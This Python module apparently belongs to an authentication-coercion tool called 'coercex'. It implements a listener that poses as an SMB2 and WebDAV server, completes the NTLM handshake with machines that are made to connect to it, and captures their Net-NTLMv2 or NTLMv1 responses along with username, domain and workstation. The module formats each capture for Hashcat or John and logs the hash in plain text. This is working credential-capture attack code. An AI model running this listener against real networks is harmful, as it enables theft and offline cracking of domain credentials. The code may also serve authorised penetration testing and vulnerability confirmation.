"""Async listener with correlation tokens and full SMB2 handshake.

Provides an HTTP listener (for WebDAV callbacks) and an SMB listener
that implements the complete SMB2 NEGOTIATE → SESSION_SETUP (NTLM
Type 1/2/3) → TREE_CONNECT handshake to:

  1. **Reliably extract the correlation token** from the TREE_CONNECT
     share path (``\\\\host\\<token>``), solving the old IP-based FIFO
     race condition where concurrent attempts for the same target could
     resolve callbacks to the wrong token.

  2. **Capture Net-NTLMv2 hashes** from the NTLM Type 3 AUTHENTICATE
     message (machine account or user account, depending on what the
     victim's outbound NTLM sends).

  3. **Extract username / domain / workstation** metadata from the
     NTLM exchange.

IP-based correlation (FIFO + timestamp) is retained as defense-in-depth
for cases where the handshake fails partway through.
"""

from __future__ import annotations

import asyncio
import logging
import os
import socket
import struct
import time
from datetime import datetime, timezone
from dataclasses import dataclass

log = logging.getLogger("coercex.listener")


def _resolve_to_ip(host: str) -> str:
    """Resolve a hostname to an IPv4 address.

    If *host* is already an IP, returns it unchanged.  If DNS fails,
    returns the original string so callers can still key on it.
    """
    try:
        socket.inet_aton(host)  # already an IP
        return host
    except OSError:
        pass
    try:
        info = socket.getaddrinfo(host, None, socket.AF_INET)
        addr_tuple = info[0][4]
        return str(addr_tuple[0])
    except (socket.gaierror, IndexError, OSError):
        log.debug("Could not resolve %s to IP, using as-is", host)
        return host


@dataclass
class AuthCallback:
    """Captured authentication callback."""

    token: str
    source_ip: str
    source_port: int
    timestamp: datetime
    transport: str  # "smb" or "http"
    raw_data: bytes = b""
    username: str = ""
    domain: str = ""
    workstation: str = ""
    ntlmv2_hash: str = ""


# ── NetBIOS / SMB2 framing helpers ──────────────────────────────────


async def _recv_netbios(reader: asyncio.StreamReader, timeout: float = 5.0) -> bytes:
    """Read one NetBIOS-framed SMB message.

    4-byte NetBIOS header: 1 byte type (0x00) + 3 bytes big-endian length,
    then *length* bytes of payload.
    """
    hdr = await asyncio.wait_for(reader.readexactly(4), timeout=timeout)
    length = struct.unpack("!I", hdr)[0] & 0x00FFFFFF  # mask type byte
    payload = await asyncio.wait_for(reader.readexactly(length), timeout=timeout)
    return payload


def _send_netbios(writer: asyncio.StreamWriter, payload: bytes) -> None:
    """Send an SMB message with 4-byte NetBIOS framing."""
    hdr = struct.pack("!I", len(payload))
    writer.write(hdr + payload)


# ── NTLM / SPNEGO builder helpers ──────────────────────────────────

# These use impacket structs to build the server-side SMB2 handshake.

_SMB2_MAGIC = b"\xfeSMB"
_SMB1_MAGIC = b"\xffSMB"

# SMB2 command codes
_SMB2_NEGOTIATE = 0x0000
_SMB2_SESSION_SETUP = 0x0001
_SMB2_TREE_CONNECT = 0x0003

# Status codes
_STATUS_SUCCESS = 0x00000000
_STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016

_SERVER_GUID = os.urandom(16)


def _build_smb2_negotiate_response(msg_id: int, challenge_token: bytes) -> bytes:
    """Build an SMB2 NEGOTIATE response with SPNEGO NegTokenInit.

    *challenge_token* is the GSSAPI blob advertising NTLMSSP as a mechtype.
    """
    from impacket.smb3structs import (
        SMB2_FLAGS_SERVER_TO_REDIR,
        SMB2_DIALECT_002,
        SMB2Packet,
        SMB2Negotiate_Response,
    )

    resp = SMB2Packet()
    resp["Flags"] = SMB2_FLAGS_SERVER_TO_REDIR
    resp["Command"] = _SMB2_NEGOTIATE
    resp["MessageID"] = msg_id
    resp["SessionID"] = 0
    resp["TreeID"] = 0
    resp["Status"] = _STATUS_SUCCESS

    body = SMB2Negotiate_Response()
    body["SecurityMode"] = 1  # signing enabled (but not required)
    body["DialectRevision"] = SMB2_DIALECT_002
    body["ServerGuid"] = _SERVER_GUID
    body["Capabilities"] = 0
    body["MaxTransactSize"] = 65536
    body["MaxReadSize"] = 65536
    body["MaxWriteSize"] = 65536
    body["SecurityBufferOffset"] = 0x80  # standard offset
    body["SecurityBufferLength"] = len(challenge_token)
    body["Buffer"] = challenge_token

    resp["Data"] = body

    return resp.getData()


def _build_smb2_session_setup_response(
    msg_id: int,
    session_id: int,
    ntlm_blob: bytes,
    status: int = _STATUS_MORE_PROCESSING_REQUIRED,
) -> bytes:
    """Build an SMB2 SESSION_SETUP response wrapping an NTLM challenge/accept."""
    from impacket.smb3structs import (
        SMB2_FLAGS_SERVER_TO_REDIR,
        SMB2Packet,
        SMB2SessionSetup_Response,
    )

    resp = SMB2Packet()
    resp["Flags"] = SMB2_FLAGS_SERVER_TO_REDIR
    resp["Command"] = _SMB2_SESSION_SETUP
    resp["MessageID"] = msg_id
    resp["SessionID"] = session_id
    resp["TreeID"] = 0
    resp["Status"] = status

    body = SMB2SessionSetup_Response()
    body["SessionFlags"] = 0
    body["SecurityBufferOffset"] = 0x48  # standard for session setup response
    body["SecurityBufferLength"] = len(ntlm_blob)
    body["Buffer"] = ntlm_blob

    resp["Data"] = body

    return resp.getData()


def _build_smb2_tree_connect_response(
    msg_id: int, session_id: int, tree_id: int
) -> bytes:
    """Build a minimal SMB2 TREE_CONNECT response (disk share)."""
    from impacket.smb3structs import (
        SMB2_FLAGS_SERVER_TO_REDIR,
        SMB2Packet,
        SMB2TreeConnect_Response,
    )

    resp = SMB2Packet()
    resp["Flags"] = SMB2_FLAGS_SERVER_TO_REDIR
    resp["Command"] = _SMB2_TREE_CONNECT
    resp["MessageID"] = msg_id
    resp["SessionID"] = session_id
    resp["TreeID"] = tree_id
    resp["Status"] = _STATUS_SUCCESS

    body = SMB2TreeConnect_Response()
    body["ShareType"] = 0x01  # SMB2_SHARE_TYPE_DISK
    body["ShareFlags"] = 0
    body["Capabilities"] = 0
    body["MaximalAccess"] = 0x001F01FF  # GENERIC_ALL

    resp["Data"] = body

    return resp.getData()


def _build_spnego_negotiate_token() -> bytes:
    """Build the GSSAPI / SPNEGO NegTokenInit advertising NTLMSSP."""
    from impacket.spnego import SPNEGO_NegTokenInit, TypesMech

    blob = SPNEGO_NegTokenInit()
    blob["MechTypes"] = [
        TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]
    ]
    return blob.getData()


def _build_ntlm_challenge(negotiate_flags: int, server_challenge: bytes) -> bytes:
    """Build an NTLM Type 2 (CHALLENGE) message.

    Returns the raw NTLMSSP blob (not SPNEGO-wrapped).
    """
    from impacket import ntlm

    challenge = ntlm.NTLMAuthChallenge()

    # Mirror flags the client wants, plus what we need
    flags = negotiate_flags
    flags |= (
        ntlm.NTLMSSP_NEGOTIATE_56
        | ntlm.NTLMSSP_NEGOTIATE_128
        | ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH
        | ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO
        | ntlm.NTLMSSP_TARGET_TYPE_SERVER
        | ntlm.NTLMSSP_NEGOTIATE_NTLM
        | ntlm.NTLMSSP_REQUEST_TARGET
        | ntlm.NTLMSSP_NEGOTIATE_UNICODE
        | ntlm.NTLMSSP_NEGOTIATE_VERSION
    )

    challenge["flags"] = flags
    challenge["challenge"] = server_challenge

    # Domain / server names
    domain = "COERCEX".encode("utf-16-le")
    hostname = "SCANNER".encode("utf-16-le")

    # Build target info (AV_PAIRS)
    av_pairs = ntlm.AV_PAIRS()
    av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = hostname
    av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = domain
    av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = "scanner.coercex.local".encode("utf-16-le")
    av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = "coercex.local".encode("utf-16-le")
    av_pairs_data = av_pairs.getData()

    challenge["domain_name"] = domain
    challenge["host_name"] = hostname
    challenge["TargetInfoFields"] = av_pairs_data
    challenge["TargetInfoFields_len"] = len(av_pairs_data)
    challenge["TargetInfoFields_max_len"] = len(av_pairs_data)

    # Version (8 bytes, use dummy)
    challenge["Version"] = b"\xff" * 8
    challenge["VersionLen"] = 8

    # Offsets: fixed header is 56 bytes, then domain_name, then target_info
    challenge["domain_offset"] = 56
    challenge["host_offset"] = 56 + len(domain)
    challenge["TargetInfoFields_offset"] = 56 + len(domain) + len(hostname)

    return challenge.getData()


def _wrap_ntlm_in_spnego_challenge(ntlm_challenge: bytes) -> bytes:
    """Wrap an NTLM Type 2 in a SPNEGO NegTokenResp (accept-incomplete)."""
    from impacket.spnego import SPNEGO_NegTokenResp, TypesMech

    resp = SPNEGO_NegTokenResp()
    resp["NegState"] = b"\x01"  # accept-incomplete
    resp["SupportedMech"] = TypesMech[
        "NTLMSSP - Microsoft NTLM Security Support Provider"
    ]
    resp["ResponseToken"] = ntlm_challenge
    return resp.getData()


def _wrap_spnego_accept_completed() -> bytes:
    """Build SPNEGO NegTokenResp for final accept (SESSION_SETUP success)."""
    from impacket.spnego import SPNEGO_NegTokenResp

    resp = SPNEGO_NegTokenResp()
    resp["NegState"] = b"\x00"  # accept-completed
    return resp.getData()


def _parse_ntlm_type3(
    raw_token: bytes, server_challenge: bytes
) -> tuple[str, str, str, str]:
    """Parse NTLM Type 3 (AUTHENTICATE) and format Net-NTLMv2 hash.

    Returns (username, domain, workstation, hash_string).
    The hash_string is in Hashcat/John format:
      ``USERNAME::DOMAIN:CHALLENGE:NTPROOFSTR:BLOB``
    """
    from impacket import ntlm

    auth = ntlm.NTLMAuthChallengeResponse()
    auth.fromString(raw_token)

    username = auth["user_name"].decode("utf-16-le")
    domain = auth["domain_name"].decode("utf-16-le")
    workstation = auth["host_name"].decode("utf-16-le")

    # Build the hash in John/Hashcat format
    nt_response = auth["ntlm"]
    lm_response = auth["lanman"]

    hash_str = ""
    if len(nt_response) > 24:
        # NTLMv2: USERNAME::DOMAIN:SERVER_CHALLENGE:NT_PROOF_STR:BLOB
        nt_proof_str = nt_response[:16]
        blob = nt_response[16:]
        hash_str = (
            f"{username}::{domain}:"
            f"{server_challenge.hex()}:"
            f"{nt_proof_str.hex()}:"
            f"{blob.hex()}"
        )
    elif len(nt_response) == 24:
        # NTLMv1: USERNAME::DOMAIN:LM_RESPONSE:NT_RESPONSE:SERVER_CHALLENGE
        hash_str = (
            f"{username}::{domain}:"
            f"{lm_response.hex()}:"
            f"{nt_response.hex()}:"
            f"{server_challenge.hex()}"
        )

    return username, domain, workstation, hash_str


def _extract_spnego_ntlm_token(raw: bytes) -> bytes:
    """Extract the raw NTLM token from a SPNEGO wrapper.

    Handles both NegTokenInit (client's first message) and
    NegTokenResp (client's second message with Type 3).
    """
    from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp

    # Try NegTokenResp first (SESSION_SETUP #2, wraps Type 3)
    try:
        resp = SPNEGO_NegTokenResp(raw)
        token = resp["ResponseToken"]
        if token and len(token) > 0:
            return bytes(token)
    except Exception:
        pass

    # Try NegTokenInit (SESSION_SETUP #1, wraps Type 1)
    try:
        init = SPNEGO_NegTokenInit(raw)
        token = init["MechToken"]
        if token and len(token) > 0:
            return bytes(token)
    except Exception:
        pass

    # Raw NTLMSSP (no SPNEGO wrapper)
    if raw[:7] == b"NTLMSSP":
        return raw

    raise ValueError("Could not extract NTLM token from SPNEGO blob")


class AsyncListener:
    """Combined HTTP + SMB listener with token correlation and full SMB2 handshake.

    Primary correlation is **token-based**: the unique 12-char hex token
    embedded in UNC paths is extracted from the TREE_CONNECT share path
    after completing a full SMB2 NEGOTIATE → SESSION_SETUP → TREE_CONNECT
    handshake.

    Fallback is **IP-based (FIFO)**: when the handshake fails partway
    and the token cannot be extracted, the callback source IP is matched
    against pending tokens registered for that target IP.

    Usage:
        listener = AsyncListener(host="0.0.0.0", http_port=80, smb_port=445)
        await listener.start()
        token, future = listener.create_token(target_ip="10.0.0.5")
        # ... trigger coercion with UNC path containing token ...
        try:
            callback = await asyncio.wait_for(future, timeout=3.0)
        except asyncio.TimeoutError:
            pass
        await listener.stop()
    """

    def __init__(
        self,
        host: str = "0.0.0.0",
        http_port: int = 80,
        smb_port: int = 445,
        enable_http: bool = True,
        enable_smb: bool = True,
    ):
        self.host = host
        self.http_port = http_port
        self.smb_port = smb_port
        self.enable_http = enable_http
        self.enable_smb = enable_smb

        # Token → Future mapping (primary correlation)
        self._pending: dict[str, asyncio.Future[AuthCallback]] = {}

        # IP-based correlation index (fallback when token can't be extracted)
        # target_ip → list of tokens in creation order (FIFO)
        self._pending_by_ip: dict[str, list[str]] = {}
        # token → target_ip (reverse index for cleanup)
        self._token_to_ip: dict[str, str] = {}

        # Timestamp-based callback log per source IP.
        # Records time.monotonic() for every callback regardless of
        # token extraction success.  Used by has_callback_since() as a
        # fallback when FIFO token correlation assigns callbacks to the
        # wrong attempt.
        self._ip_callback_times: dict[str, list[float]] = {}

        self._callbacks: list[AuthCallback] = []
        self._http_server: asyncio.Server | None = None
        self._smb_server: asyncio.Server | None = None
        self._loop: asyncio.AbstractEventLoop | None = None

    async def start(self) -> None:
        """Start the listener servers."""
        self._loop = asyncio.get_running_loop()

        if self.enable_http:
            try:
                self._http_server = await asyncio.start_server(
                    self._handle_http,
                    self.host,
                    self.http_port,
                )
                log.info("HTTP listener started on %s:%d", self.host, self.http_port)
            except OSError as e:
                log.warning(
                    "Could not start HTTP listener on port %d: %s", self.http_port, e
                )

        if self.enable_smb:
            try:
                self._smb_server = await asyncio.start_server(
                    self._handle_smb,
                    self.host,
                    self.smb_port,
                )
                log.info("SMB listener started on %s:%d", self.host, self.smb_port)
            except OSError as e:
                log.warning(
                    "Could not start SMB listener on port %d: %s", self.smb_port, e
                )

    async def stop(self) -> None:
        """Stop all listeners and cancel pending futures."""
        for server in (self._http_server, self._smb_server):
            if server:
                server.close()
                await server.wait_closed()

        # Cancel any remaining pending futures
        for token, future in self._pending.items():
            if not future.done():
                future.cancel()
        self._pending.clear()
        self._pending_by_ip.clear()
        self._token_to_ip.clear()
        self._ip_callback_times.clear()

    def create_token(
        self, target_ip: str = ""
    ) -> tuple[str, asyncio.Future[AuthCallback]]:
        """Create a correlation token and return (token, future).

        The future resolves when a callback matching this token is received.

        Args:
            target_ip: IP (or hostname) of the target that will call back.
                       Used for IP-based fallback correlation when the token
                       cannot be extracted from the raw SMB data.  Hostnames
                       are resolved to IPs so they match callback source IPs.
        """
        import uuid

        token = uuid.uuid4().hex[:12]
        future: asyncio.Future[AuthCallback] = (
            self._loop.create_future()
            if self._loop
            else asyncio.get_running_loop().create_future()
        )
        self._pending[token] = future

        # Register in IP-based index for fallback correlation
        if target_ip:
            resolved = _resolve_to_ip(target_ip)
            self._token_to_ip[token] = resolved
            self._pending_by_ip.setdefault(resolved, []).append(token)

        return token, future

    def cancel_token(self, token: str) -> None:
        """Cancel and remove a pending token (including IP index)."""
        future = self._pending.pop(token, None)
        if future and not future.done():
            future.cancel()

        # Clean up IP-based index
        ip = self._token_to_ip.pop(token, None)
        if ip and ip in self._pending_by_ip:
            try:
                self._pending_by_ip[ip].remove(token)
            except ValueError:
                pass
            if not self._pending_by_ip[ip]:
                del self._pending_by_ip[ip]

    def _resolve_token(self, token: str, callback: AuthCallback) -> None:
        """Try to resolve a token with a callback."""
        self._callbacks.append(callback)
        future = self._pending.pop(token, None)
        if future and not future.done():
            future.set_result(callback)
            log.info(
                "Callback received: token=%s src=%s:%d transport=%s",
                token,
                callback.source_ip,
                callback.source_port,
                callback.transport,
            )
            # Clean up IP-based index since this token is now resolved
            ip = self._token_to_ip.pop(token, None)
            if ip and ip in self._pending_by_ip:
                try:
                    self._pending_by_ip[ip].remove(token)
                except ValueError:
                    pass
                if not self._pending_by_ip[ip]:
                    del self._pending_by_ip[ip]
        else:
            log.debug(
                "Callback for unknown/expired token=%s from %s",
                token,
                callback.source_ip,
            )

    def _extract_token_from_path(self, path: str) -> str | None:
        """Extract a 12-char hex token from a URL/share path.

        Tokens are embedded as share names or URL path segments.
        Examples:
            /abc123def456/file.txt -> abc123def456
            \\\\host\\abc123def456\\file.txt -> abc123def456
        """
        # Normalize separators
        parts = path.replace("\\", "/").strip("/").split("/")
        for part in parts:
            part = part.strip()
            if len(part) == 12:
                try:
                    int(part, 16)
                    return part
                except ValueError:
                    continue
        return None

    # ── HTTP Handler ────────────────────────────────────────────────────

    async def _handle_http(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        """Handle incoming HTTP connections (WebDAV callbacks)."""
        try:
            peername = writer.get_extra_info("peername")
            src_ip = peername[0] if peername else "unknown"
            src_port = peername[1] if peername else 0

            # Record callback timestamp for has_callback_since() fallback
            self._ip_callback_times.setdefault(src_ip, []).append(time.monotonic())

            # Read the HTTP request line
            request_line = await asyncio.wait_for(reader.readline(), timeout=5.0)
            if not request_line:
                return

            request_str = request_line.decode("utf-8", errors="replace").strip()
            parts = request_str.split()
            path = parts[1] if len(parts) >= 2 else "/"

            # Read remaining headers (discard them)
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=2.0)
                if line in (b"\r\n", b"\n", b""):
                    break

            log.debug("HTTP request from %s:%d: %s", src_ip, src_port, request_str)

            token = self._extract_token_from_path(path)
            callback = AuthCallback(
                token=token or "",
                source_ip=src_ip,
                source_port=src_port,
                timestamp=datetime.now(timezone.utc),
                transport="http",
                raw_data=request_line,
            )
            if token:
                self._resolve_token(token, callback)
            else:
                # No token in path — fall back to IP-based correlation
                self._resolve_by_ip(src_ip, callback)

            # Send 401 to request NTLM auth (or just close)
            response = (
                b"HTTP/1.1 401 Unauthorized\r\n"
                b"WWW-Authenticate: NTLM\r\n"
                b"Content-Length: 0\r\n"
                b"Connection: close\r\n\r\n"
            )
            writer.write(response)
            await writer.drain()

        except (asyncio.TimeoutError, ConnectionError, OSError):
            pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    # ── SMB Handler ─────────────────────────────────────────────────────

    async def _handle_smb(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        """Handle incoming SMB connections with full SMB2 handshake.

        Implements the complete SMB2 NEGOTIATE → SESSION_SETUP (NTLM
        Type 1/2/3) → TREE_CONNECT flow.  This achieves:

        1. **Token-based correlation** via the share path in TREE_CONNECT
           (e.g. ``\\\\10.0.0.1\\abc123def456``).
        2. **Net-NTLMv2 hash capture** from the Type 3 AUTHENTICATE message.
        3. **Username / domain / workstation** metadata extraction.

        Falls back to IP-based correlation if the handshake fails partway.
        """
        peername = writer.get_extra_info("peername")
        src_ip = peername[0] if peername else "unknown"
        src_port = peername[1] if peername else 0

        # Record callback timestamp for has_callback_since() fallback
        self._ip_callback_times.setdefault(src_ip, []).append(time.monotonic())

        log.debug("SMB connection from %s:%d", src_ip, src_port)

        # Metadata accumulated through the handshake
        username = ""
        domain = ""
        workstation = ""
        ntlmv2_hash = ""
        token: str | None = None
        session_id = os.urandom(8)  # random 64-bit session ID
        server_challenge = os.urandom(8)

        try:
            # ── Step 1: Receive NEGOTIATE ───────────────────────────────
            raw = await _recv_netbios(reader, timeout=5.0)
            if len(raw) < 4:
                return

            # Determine SMB version from magic bytes
            magic = raw[:4]
            if magic == _SMB1_MAGIC:
                # SMB1 NEGOTIATE — respond with SMB2 NEGOTIATE response
                # to upgrade the client to SMB2
                log.debug("SMB1 NEGOTIATE from %s, upgrading to SMB2", src_ip)
                msg_id = 0
            elif magic == _SMB2_MAGIC:
                # Parse the SMB2 message ID for proper response sequencing
                from impacket.smb3structs import SMB2Packet

                pkt = SMB2Packet(raw)
                msg_id = pkt["MessageID"]
            else:
                log.debug(
                    "Unknown SMB magic %s from %s, falling back to IP",
                    magic.hex(),
                    src_ip,
                )
                self._ip_fallback_callback(src_ip, src_port, raw[:256])
                return

            # ── Step 2: Send NEGOTIATE response (SPNEGO w/ NTLMSSP) ────
            spnego_init = _build_spnego_negotiate_token()
            neg_resp = _build_smb2_negotiate_response(msg_id, spnego_init)
            _send_netbios(writer, neg_resp)
            await writer.drain()

            # ── Step 3: Receive SESSION_SETUP #1 (NTLM Type 1) ────────
            raw = await _recv_netbios(reader, timeout=5.0)
            if len(raw) < 4 or raw[:4] != _SMB2_MAGIC:
                self._ip_fallback_callback(src_ip, src_port, raw[:256])
                return

            from impacket.smb3structs import SMB2Packet, SMB2SessionSetup

            pkt = SMB2Packet(raw)
            msg_id = pkt["MessageID"]

            if pkt["Command"] != _SMB2_SESSION_SETUP:
                log.debug(
                    "Expected SESSION_SETUP, got command %d from %s",
                    pkt["Command"],
                    src_ip,
                )
                self._ip_fallback_callback(src_ip, src_port, raw[:256])
                return

            setup = SMB2SessionSetup(pkt["Data"])
            sec_buf_offset = setup["SecurityBufferOffset"]
            sec_buf_len = setup["SecurityBufferLength"]

            # The security buffer is at (offset - header_size) within Data,
            # but impacket stores it directly as Buffer in some builds.
            # Extract from raw packet data using offset from SMB2 header start.
            # SMB2 header is 64 bytes; security buffer offset is from
            # beginning of SMB2 header.
            sec_blob = raw[sec_buf_offset:][:sec_buf_len]

            ntlm_type1 = _extract_spnego_ntlm_token(sec_blob)
            if ntlm_type1[:7] != b"NTLMSSP":
                log.debug("No NTLMSSP in SESSION_SETUP #1 from %s", src_ip)
                self._ip_fallback_callback(src_ip, src_port, raw[:256])
                return

            # Parse Type 1 to get negotiate flags
            from impacket.ntlm import NTLMAuthNegotiate

            type1 = NTLMAuthNegotiate()
            type1.fromString(ntlm_type1)
            negotiate_flags = type1["flags"]

            # ── Step 4: Send SESSION_SETUP response (NTLM Type 2) ──────
            ntlm_challenge = _build_ntlm_challenge(negotiate_flags, server_challenge)
            spnego_challenge = _wrap_ntlm_in_spnego_challenge(ntlm_challenge)
            sess_resp = _build_smb2_session_setup_response(
                msg_id=msg_id,
                session_id=int.from_bytes(session_id, "little"),
                ntlm_blob=spnego_challenge,
                status=_STATUS_MORE_PROCESSING_REQUIRED,
            )
            _send_netbios(writer, sess_resp)
            await writer.drain()

            # ── Step 5: Receive SESSION_SETUP #2 (NTLM Type 3) ────────
            raw = await _recv_netbios(reader, timeout=5.0)
            if len(raw) < 4 or raw[:4] != _SMB2_MAGIC:
                self._ip_fallback_callback(src_ip, src_port, raw[:256])
                return

            pkt = SMB2Packet(raw)
            msg_id = pkt["MessageID"]

            if pkt["Command"] != _SMB2_SESSION_SETUP:
                log.debug(
                    "Expected SESSION_SETUP #2, got command %d from %s",
                    pkt["Command"],
                    src_ip,
                )
                self._ip_fallback_callback(src_ip, src_port, raw[:256])
                return

            setup = SMB2SessionSetup(pkt["Data"])
            sec_buf_offset = setup["SecurityBufferOffset"]
            sec_buf_len = setup["SecurityBufferLength"]
            sec_blob = raw[sec_buf_offset:][:sec_buf_len]

            ntlm_type3_raw = _extract_spnego_ntlm_token(sec_blob)

            # Parse Type 3 and extract credentials + hash
            username, domain, workstation, ntlmv2_hash = _parse_ntlm_type3(
                ntlm_type3_raw, server_challenge
            )
            log.info(
                "NTLM auth from %s: %s\\%s (%s)",
                src_ip,
                domain,
                username,
                workstation,
            )
            if ntlmv2_hash:
                log.info("Net-NTLMv2 hash: %s", ntlmv2_hash)

            # ── Step 6: Send SESSION_SETUP success ─────────────────────
            accept_blob = _wrap_spnego_accept_completed()
            sess_success = _build_smb2_session_setup_response(
                msg_id=msg_id,
                session_id=int.from_bytes(session_id, "little"),
                ntlm_blob=accept_blob,
                status=_STATUS_SUCCESS,
            )
            _send_netbios(writer, sess_success)
            await writer.drain()

            # ── Step 7: Receive TREE_CONNECT ───────────────────────────
            raw = await _recv_netbios(reader, timeout=5.0)
            if len(raw) < 4 or raw[:4] != _SMB2_MAGIC:
                # No TREE_CONNECT — still resolve by IP + metadata
                log.debug("No TREE_CONNECT from %s, using IP fallback", src_ip)
                callback = AuthCallback(
                    token="",
                    source_ip=src_ip,
                    source_port=src_port,
                    timestamp=datetime.now(timezone.utc),
                    transport="smb",
                    raw_data=raw[:256],
                    username=username,
                    domain=domain,
                    workstation=workstation,
                    ntlmv2_hash=ntlmv2_hash,
                )
                self._resolve_by_ip(src_ip, callback)
                return

            from impacket.smb3structs import SMB2TreeConnect

            pkt = SMB2Packet(raw)
            msg_id = pkt["MessageID"]

            if pkt["Command"] != _SMB2_TREE_CONNECT:
                log.debug(
                    "Expected TREE_CONNECT, got command %d from %s",
                    pkt["Command"],
                    src_ip,
                )
                callback = AuthCallback(
                    token="",
                    source_ip=src_ip,
                    source_port=src_port,
                    timestamp=datetime.now(timezone.utc),
                    transport="smb",
                    raw_data=raw[:256],
                    username=username,
                    domain=domain,
                    workstation=workstation,
                    ntlmv2_hash=ntlmv2_hash,
                )
                self._resolve_by_ip(src_ip, callback)
                return

            # Extract the UNC path (UTF-16LE) from TREE_CONNECT
            tc = SMB2TreeConnect(pkt["Data"])
            path_offset = tc["PathOffset"]
            path_length = tc["PathLength"]
            unc_bytes = raw[path_offset:][:path_length]
            unc_path = unc_bytes.decode("utf-16-le", errors="replace")
            log.debug("TREE_CONNECT path from %s: %s", src_ip, unc_path)

            token = self._extract_token_from_path(unc_path)

            # ── Step 8: Send TREE_CONNECT response ─────────────────────
            tree_resp = _build_smb2_tree_connect_response(
                msg_id=msg_id,
                session_id=int.from_bytes(session_id, "little"),
                tree_id=1,
            )
            _send_netbios(writer, tree_resp)
            await writer.drain()

            # ── Resolve the callback ───────────────────────────────────
            callback = AuthCallback(
                token=token or "",
                source_ip=src_ip,
                source_port=src_port,
                timestamp=datetime.now(timezone.utc),
                transport="smb",
                raw_data=unc_bytes[:256],
                username=username,
                domain=domain,
                workstation=workstation,
                ntlmv2_hash=ntlmv2_hash,
            )

            if token:
                self._resolve_token(token, callback)
            else:
                self._resolve_by_ip(src_ip, callback)

        except (asyncio.TimeoutError, asyncio.IncompleteReadError):
            log.debug("SMB handshake timeout/incomplete from %s:%d", src_ip, src_port)
            # Partial handshake — still resolve by IP if we can
            callback = AuthCallback(
                token="",
                source_ip=src_ip,
                source_port=src_port,
                timestamp=datetime.now(timezone.utc),
                transport="smb",
                username=username,
                domain=domain,
                workstation=workstation,
                ntlmv2_hash=ntlmv2_hash,
            )
            self._resolve_by_ip(src_ip, callback)
        except (ConnectionError, OSError) as exc:
            log.debug("SMB connection error from %s:%d: %s", src_ip, src_port, exc)
        except Exception as exc:
            log.warning(
                "SMB handshake error from %s:%d: %s",
                src_ip,
                src_port,
                exc,
                exc_info=True,
            )
            # Best-effort IP fallback
            try:
                callback = AuthCallback(
                    token="",
                    source_ip=src_ip,
                    source_port=src_port,
                    timestamp=datetime.now(timezone.utc),
                    transport="smb",
                    username=username,
                    domain=domain,
                    workstation=workstation,
                    ntlmv2_hash=ntlmv2_hash,
                )
                self._resolve_by_ip(src_ip, callback)
            except Exception:
                pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    def _ip_fallback_callback(
        self, src_ip: str, src_port: int, raw: bytes = b""
    ) -> None:
        """Create an AuthCallback and resolve by IP (early handshake failure)."""
        callback = AuthCallback(
            token="",
            source_ip=src_ip,
            source_port=src_port,
            timestamp=datetime.now(timezone.utc),
            transport="smb",
            raw_data=raw,
        )
        self._resolve_by_ip(src_ip, callback)

    def _resolve_by_ip(self, src_ip: str, callback: AuthCallback) -> None:
        """Fallback: resolve the oldest pending token for a source IP (FIFO).

        When token extraction from raw SMB data fails, we match the callback
        source IP against pending tokens registered for that target.  The
        oldest (first-created) pending token is resolved — this gives
        target-level VULNERABLE confirmation with a best-guess at which
        trigger actually caused the callback.
        """
        self._callbacks.append(callback)

        token_list = self._pending_by_ip.get(src_ip)
        if not token_list:
            log.info("SMB callback from %s — no pending tokens for this IP", src_ip)
            return

        # Walk the FIFO list, find the first token whose future is still pending
        while token_list:
            token = token_list[0]
            future = self._pending.get(token)
            if future and not future.done():
                # Found a live pending future — resolve it
                token_list.pop(0)
                self._pending.pop(token, None)
                self._token_to_ip.pop(token, None)
                callback.token = token
                future.set_result(callback)
                log.info(
                    "IP-correlated callback: src=%s token=%s (FIFO best-guess)",
                    src_ip,
                    token,
                )
                if not token_list:
                    del self._pending_by_ip[src_ip]
                return
            else:
                # Token already resolved/cancelled — skip it
                token_list.pop(0)
                self._token_to_ip.pop(token, None)

        # All tokens for this IP were already resolved/cancelled
        del self._pending_by_ip[src_ip]
        log.info("SMB callback from %s — all pending tokens already resolved", src_ip)

    def has_callback_since(self, target: str, since: float) -> bool:
        """Check if any callback arrived from *target* at or after *since*.

        *target* can be a hostname or IP — it is resolved to an IP before
        comparison.  *since* should be a ``time.monotonic()`` timestamp
        recorded **before** the coercion trigger was fired.

        This is a fallback for the FIFO race condition: even when FIFO
        assigns the callback to the wrong token, the raw timestamp log
        proves the target did call back during this attempt's window.
        """
        resolved = _resolve_to_ip(target)
        timestamps = self._ip_callback_times.get(resolved)
        if not timestamps:
            return False
        return any(t >= since for t in timestamps)

    @property
    def callbacks(self) -> list[AuthCallback]:
        """All received callbacks."""
        return list(self._callbacks)

    @property
    def is_running(self) -> bool:
        return bool(self._http_server or self._smb_server)
